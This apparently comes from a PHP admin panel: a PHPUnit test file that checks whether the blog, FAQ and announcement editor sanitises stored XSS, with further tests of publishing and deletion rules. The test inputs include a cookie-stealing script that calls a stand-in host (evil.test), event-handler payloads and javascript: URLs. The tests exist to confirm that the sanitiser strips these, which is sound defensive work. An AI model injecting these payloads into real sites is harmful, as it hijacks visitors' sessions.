<?php
use PHPUnit\Framework\TestCase;

require_once dirname(__DIR__).'/_support/FakeDb.php';
require_once dirname(__DIR__).'/_support/IntegrationHarness.php';

/**
 * Blog, FAQ and announcement editing (Session 30).
 *
 * All three were routed and permissioned in Session 15 with no controller
 * behind them, so `admin/blog`, `admin/faq` and `admin/announcements` 404'd
 * and the public blog, help page and announcement banner could only be filled
 * by SQL.
 *
 * The bulk of these tests are about **stored XSS**, because this is the one
 * screen in the panel whose output is rendered unescaped:
 * `views/public/blog/detail.php` prints a post body raw, commented "stored as
 * trusted HTML by staff". That makes the editor a path from a staff session
 * to script on a page seen by every visitor, so the sanitiser is the feature
 * and the CRUD is the wrapper around it.
 *
 * The panel's nonce CSP would refuse an injected inline script in a correctly
 * configured deploy. That is a mitigation, not a reason to store the payload,
 * so these tests assert it never reaches the database in the first place.
 */
class AdminContentTest extends TestCase
{
    private static $root;

    public static function setUpBeforeClass(): void
    {
        self::$root = dirname(dirname(__DIR__));
        if (!defined('BASEPATH')) define('BASEPATH', self::$root.'/system/');
        if (!class_exists('CI_Model')) {
            eval('#[AllowDynamicProperties] class CI_Model { public $db; }');
        }
        if (!function_exists('get_instance')) {
            eval('function &get_instance(){ return $GLOBALS["__fake_ci"]; }');
        }
        if (!function_exists('log_message')) eval('function log_message($l,$m){}');
        require_once self::$root.'/application/core/MY_Model.php';
        require_once self::$root.'/application/helpers/windels_helper.php';
    }

    private function app()
    {
        $app = new IntegrationHarness();
        $app->seed_minimal();
        $app->library('ContentService');
        $app->model(array('Blog_post_model', 'Blog_category_model', 'Faq_model', 'Announcement_model'));
        $app->db->insert('blog_categories', array(
            'name' => 'Updates', 'slug' => 'updates', 'created_at' => gmdate('Y-m-d H:i:s'),
        ));
        $author = $app->register('editor', 'editor@x.test', 'Str0ng!pass1', 'ADMIN');
        return array($app, $author);
    }

    private function post($app, $author, array $over = array())
    {
        return $app->contentservice->save('blog', null, array_merge(array(
            'title'   => 'Hello world',
            'content' => '<p>A normal post.</p>',
            'status'  => 'DRAFT',
        ), $over), $author->id);
    }

    /* ======================== stored XSS: the point ===================== */

    /**
     * The payload that matters: the public template prints this field raw, so
     * a surviving <script> is script on every visitor's browser.
     */
    public function testAScriptTagNeverReachesTheDatabase()
    {
        list($app, $author) = $this->app();

        $res = $this->post($app, $author, array(
            'content' => '<p>Hi</p><script>fetch("//evil.test?c="+document.cookie)</script>',
        ));

        $this->assertTrue($res['ok'], $res['error'] ?? '');
        $stored = $res['row']->content;
        $this->assertStringNotContainsString('<script', strtolower($stored));
        $this->assertStringNotContainsString('document.cookie', $stored,
            'the script body must be removed with the tag, not left as text');
        $this->assertStringContainsString('<p>Hi</p>', $stored, 'legitimate markup must survive');
    }

    /**
     * strip_tags() would remove <script> and leave `alert(1)` as visible text.
     * Dangerous elements have to go together with their contents.
     */
    public function testDangerousElementsAreRemovedWithTheirContents()
    {
        list($app, $author) = $this->app();

        $res = $this->post($app, $author, array(
            'content' => '<p>ok</p><style>body{display:none}</style>'
                        .'<iframe src="//evil.test"></iframe>'
                        .'<object data="x.swf"></object><form action="/x"><input></form>',
        ));

        $stored = strtolower($res['row']->content);
        foreach (array('<style', '<iframe', '<object', '<form', 'display:none', 'evil.test') as $bad) {
            $this->assertStringNotContainsString($bad, $stored, $bad.' must not survive');
        }
        $this->assertStringContainsString('<p>ok</p>', $stored);
    }

    /** An unclosed dangerous tag is still honoured by a browser. */
    public function testAnUnclosedScriptTagIsAlsoRemoved()
    {
        list($app, $author) = $this->app();
        $res = $this->post($app, $author, array('content' => '<p>hi</p><script src="//evil.test/x.js">'));
        $this->assertStringNotContainsString('<script', strtolower($res['row']->content));
    }

    /**
     * Event handlers ride on tags that are *allowed*, so tag filtering alone
     * misses them entirely.
     */
    public function testEventHandlersAreStrippedFromAllowedTags()
    {
        list($app, $author) = $this->app();

        $res = $this->post($app, $author, array(
            'content' => '<p onclick="steal()">text</p><img src="x" onerror="steal()">',
        ));

        $stored = strtolower($res['row']->content);
        $this->assertStringNotContainsString('onclick', $stored);
        $this->assertStringNotContainsString('onerror', $stored);
        $this->assertStringNotContainsString('steal()', $stored);
        $this->assertStringContainsString('<p', $stored, 'the tag itself is fine, only the handler goes');
    }

    /** javascript: and data: URLs execute from an ordinary link. */
    public function testScriptBearingUrlsAreDefused()
    {
        list($app, $author) = $this->app();

        $res = $this->post($app, $author, array(
            'content' => '<p><a href="javascript:steal()">click</a>'
                        .'<img src="data:text/html;base64,PHNjcmlwdD4="></p>',
        ));

        $stored = strtolower($res['row']->content);
        $this->assertStringNotContainsString('javascript:', $stored);
        $this->assertStringNotContainsString('data:text/html', $stored);
    }

    public function testSrcdocIsRemoved()
    {
        list($app, $author) = $this->app();
        $res = $this->post($app, $author, array(
            'content' => '<p srcdoc="<script>steal()</script>">x</p>',
        ));
        $this->assertStringNotContainsString('srcdoc', strtolower($res['row']->content));
    }

    /** An ordinary rich-text post must come through unharmed. */
    public function testLegitimateFormattingSurvives()
    {
        list($app, $author) = $this->app();
        $html = '<h2>Heading</h2><p>Some <strong>bold</strong> and <em>italic</em> text, '
               .'a <a href="https://example.test">link</a>.</p>'
               .'<ul><li>one</li><li>two</li></ul><blockquote>quoted</blockquote>';

        $res = $this->post($app, $author, array('content' => $html));

        foreach (array('<h2>', '<strong>', '<em>', '<ul>', '<li>', '<blockquote>',
                       'https://example.test') as $keep) {
            $this->assertStringContainsString($keep, $res['row']->content,
                $keep.' is legitimate and must survive');
        }
    }

    /** The same sanitiser guards FAQ answers and announcement bodies. */
    public function testFaqAnswersAndAnnouncementsAreSanitisedToo()
    {
        list($app, ) = $this->app();

        $faq = $app->contentservice->save('faq', null, array(
            'question' => 'Is it safe?', 'answer' => '<p>Yes</p><script>steal()</script>', 'is_active' => '1',
        ));
        $this->assertTrue($faq['ok'], $faq['error'] ?? '');
        $this->assertStringNotContainsString('<script', strtolower($faq['row']->answer));

        $ann = $app->contentservice->save('announcements', null, array(
            'title' => 'Notice', 'content' => '<p>Hi</p><script>steal()</script>',
            'severity' => 'INFO', 'audience' => 'all', 'is_active' => '1',
        ));
        $this->assertTrue($ann['ok'], $ann['error'] ?? '');
        $this->assertStringNotContainsString('<script', strtolower($ann['row']->content));
    }

    /** Plain-text fields never store markup at all. */
    public function testPlainTextFieldsAreStrippedEntirely()
    {
        list($app, $author) = $this->app();
        $res = $this->post($app, $author, array('excerpt' => '<b>bold</b> excerpt'));
        $this->assertSame('bold excerpt', $res['row']->excerpt);
    }

    public function testAScriptUrlInTheFeaturedImageIsRejected()
    {
        list($app, $author) = $this->app();
        $res = $this->post($app, $author, array('featured_image' => 'javascript:steal()'));
        $this->assertNull($res['row']->featured_image);
    }

    /* ========================== publishing rules ======================== */

    /**
     * The public query filters on `published_at`, so a PUBLISHED post with a
     * NULL date is invisible — which reads as a broken site, not a draft.
     */
    public function testPublishingSetsTheDateThePublicQueryFiltersOn()
    {
        list($app, $author) = $this->app();

        $res = $this->post($app, $author, array('status' => 'PUBLISHED'));

        $this->assertNotEmpty($res['row']->published_at);
        $found = $app->Blog_post_model->find_published($res['row']->slug);
        $this->assertNotNull($found, 'a published post must be reachable by the public query');
    }

    /** Re-editing a live post must not silently re-date it. */
    public function testEditingAPublishedPostKeepsItsOriginalDate()
    {
        list($app, $author) = $this->app();
        $created = $this->post($app, $author, array('status' => 'PUBLISHED'));
        $original = $created['row']->published_at;

        $res = $app->contentservice->save('blog', $created['row'], array(
            'title' => 'Hello world', 'content' => '<p>Edited.</p>', 'status' => 'PUBLISHED',
            'slug' => $created['row']->slug,
        ), $author->id);

        $this->assertSame($original, $res['row']->published_at);
    }

    public function testADraftIsNotVisibleToThePublicQuery()
    {
        list($app, $author) = $this->app();
        $res = $this->post($app, $author, array('status' => 'DRAFT'));
        $this->assertNull($app->Blog_post_model->find_published($res['row']->slug));
    }

    public function testSlugsAreDerivedAndMustBeUnique()
    {
        list($app, $author) = $this->app();

        $first = $this->post($app, $author, array('title' => 'Hello There World!'));
        $this->assertSame('hello-there-world', $first['row']->slug);

        $clash = $this->post($app, $author, array('title' => 'Different', 'slug' => 'hello-there-world'));
        $this->assertFalse($clash['ok']);
        $this->assertSame('DUPLICATE', $clash['code']);
    }

    public function testEmptyTitleOrBodyIsRefused()
    {
        list($app, $author) = $this->app();

        $this->assertFalse($this->post($app, $author, array('title' => '  '))['ok']);
        $this->assertFalse($this->post($app, $author, array('content' => '   '))['ok']);
        // A body that is only a script is empty once sanitised.
        $only_script = $this->post($app, $author, array('content' => '<script>steal()</script>'));
        $this->assertFalse($only_script['ok'],
            'a body that is nothing but a stripped payload must not save as blank');
    }

    /* ========================== announcements =========================== */

    public function testAnAnnouncementWindowMustNotCloseBeforeItOpens()
    {
        list($app, ) = $this->app();

        $res = $app->contentservice->save('announcements', null, array(
            'title' => 'Maintenance', 'content' => '<p>Later.</p>', 'severity' => 'WARNING',
            'audience' => 'all', 'is_active' => '1',
            'starts_at' => '2026-09-02 10:00', 'ends_at' => '2026-09-01 10:00',
        ));

        $this->assertFalse($res['ok']);
        $this->assertStringContainsString('ends before', strtolower($res['error']));
    }

    /** A live announcement must actually reach the banner query. */
    public function testAnActiveAnnouncementIsVisibleToTheBanner()
    {
        list($app, ) = $this->app();

        $app->contentservice->save('announcements', null, array(
            'title' => 'We are live', 'content' => '<p>Hello.</p>', 'severity' => 'INFO',
            'audience' => 'all', 'is_active' => '1',
        ));

        $visible = $app->Announcement_model->visible('customers');
        $this->assertCount(1, $visible);
        $this->assertSame('We are live', $visible[0]->title);
    }

    public function testAHiddenAnnouncementIsNotShown()
    {
        list($app, ) = $this->app();
        $res = $app->contentservice->save('announcements', null, array(
            'title' => 'Draft notice', 'content' => '<p>Hi.</p>', 'severity' => 'INFO',
            'audience' => 'all', 'is_active' => '0',
        ));
        $this->assertSame(array(), $app->Announcement_model->visible('customers'));

        $app->contentservice->set_active('announcements', $res['row'], true);
        $this->assertCount(1, $app->Announcement_model->visible('customers'));
    }

    public function testUnknownSeverityOrAudienceIsRefused()
    {
        list($app, ) = $this->app();
        $base = array('title' => 'X', 'content' => '<p>x</p>', 'is_active' => '1');

        $this->assertFalse($app->contentservice->save('announcements', null,
            array_merge($base, array('severity' => 'PANIC', 'audience' => 'all')))['ok']);
        $this->assertFalse($app->contentservice->save('announcements', null,
            array_merge($base, array('severity' => 'INFO', 'audience' => 'martians')))['ok']);
    }

    /* ============================== FAQ ================================= */

    public function testAnFaqAppearsInTheCustomerListOnlyWhenActive()
    {
        list($app, ) = $this->app();

        $res = $app->contentservice->save('faq', null, array(
            'question' => 'How do I top up?', 'answer' => '<p>From the wallet page.</p>',
            'category' => 'Payments', 'sorting' => '1', 'is_active' => '0',
        ));
        $this->assertSame(array(), $app->Faq_model->active());

        $app->contentservice->set_active('faq', $res['row'], true);
        $live = $app->Faq_model->active();
        $this->assertCount(1, $live);
        $this->assertSame('How do I top up?', $live[0]->question);
    }

    public function testFaqsAreFoundByIdBecauseTheyHaveNoPublicId()
    {
        list($app, ) = $this->app();
        $res = $app->contentservice->save('faq', null, array(
            'question' => 'Q?', 'answer' => '<p>A.</p>', 'is_active' => '1',
        ));
        $this->assertNotNull($app->contentservice->find('faq', $res['row']->id));
        $this->assertNull($app->contentservice->find('faq', 'not-a-number'));
    }

    /* ============================= deletion ============================= */

    /**
     * Deleting a live post would 404 every inbound link to it; archiving
     * keeps the URL resolvable and off the index.
     */
    public function testAPublishedPostIsArchivedRatherThanDeleted()
    {
        list($app, $author) = $this->app();
        $res = $this->post($app, $author, array('status' => 'PUBLISHED'));

        $del = $app->contentservice->delete('blog', $res['row']);

        $this->assertFalse($del['ok']);
        $this->assertSame('PUBLISHED', $del['code']);
        $this->assertNotNull($app->Blog_post_model->find_by_id($res['row']->id));
    }

    public function testADraftCanBeDeleted()
    {
        list($app, $author) = $this->app();
        $res = $this->post($app, $author, array('status' => 'DRAFT'));

        $del = $app->contentservice->delete('blog', $res['row']);

        $this->assertTrue($del['ok'], $del['error'] ?? '');
        $this->assertNull($app->Blog_post_model->find_by_id($res['row']->id));
    }

    /* ============================= listing ============================== */

    public function testTheAdminListShowsDraftsThatThePublicListHides()
    {
        list($app, $author) = $this->app();
        $this->post($app, $author, array('title' => 'A draft', 'status' => 'DRAFT'));
        $this->post($app, $author, array('title' => 'A live one', 'status' => 'PUBLISHED'));

        $grid = $app->contentservice->grid('blog', array());
        $this->assertSame(2, (int)$grid['total']);
        $this->assertCount(1, $app->Blog_post_model->published());
    }

    public function testTheAdminListDoesNotSelectTheBodyBlob()
    {
        list($app, $author) = $this->app();
        $this->post($app, $author);

        $row = $app->contentservice->grid('blog', array())['rows'][0];

        $this->assertNotContains('content', array_keys(get_object_vars($row)),
            'a listing of titles must not pull every MEDIUMTEXT body');
    }

    /* ======================= controller guarantees ====================== */

    public function testEachDomainIsGatedOnItsOwnPermission()
    {
        $this->assertSame('blog.manage', ContentService::permission('blog'));
        $this->assertSame('faq.manage', ContentService::permission('faq'));
        $this->assertSame('announcements.manage', ContentService::permission('announcements'));

        $src = file_get_contents(self::$root.'/application/controllers/admin/Content.php');
        // blog.manage must not imply raising a CRITICAL banner for everyone.
        $this->assertStringContainsString('ContentService::permission($domain)', $src);
        $this->assertStringContainsString("method(true) !== 'POST') show_404()", $src);
        $this->assertStringContainsString('$this->audit(', $src);
    }

    /** An audit row must not carry a 40 KB post body. */
    public function testTheAuditPayloadOmitsTheBody()
    {
        $src = file_get_contents(self::$root.'/application/controllers/admin/Content.php');
        $this->assertStringContainsString('bytes]', $src,
            'the audit payload should summarise large fields rather than copy them');
    }
}
